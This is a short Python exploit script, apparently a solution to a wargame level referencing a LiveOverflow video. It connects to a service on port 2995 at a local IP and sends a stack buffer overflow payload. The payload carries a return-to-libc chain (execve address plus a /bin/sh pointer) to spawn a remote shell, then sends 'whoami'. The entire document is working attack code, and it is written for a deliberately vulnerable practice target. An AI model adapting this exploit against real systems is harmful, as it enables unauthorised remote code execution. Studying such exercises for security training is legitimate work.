import struct
import socket

# LiveOverflow: https://www.youtube.com/watch?v=HAN8Qun26cQ

HOST = '192.168.0.102'
PORT = 2995
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

padding = b"a" * 510 + b"\x00" + b"aaaabbbbccccddddeeeef"
execve = struct.pack("I", 0x08048c0c)
binsh = struct.pack("I", 1176511 + 0xb7e97000)
exploit = padding + execve + b"AAAA" + binsh + b"\x00" * 8

s.send(exploit + b"\n")
s.send(b"whoami\n")
# s.send(b"id\n")
print(s.recv(1024))
s.close()
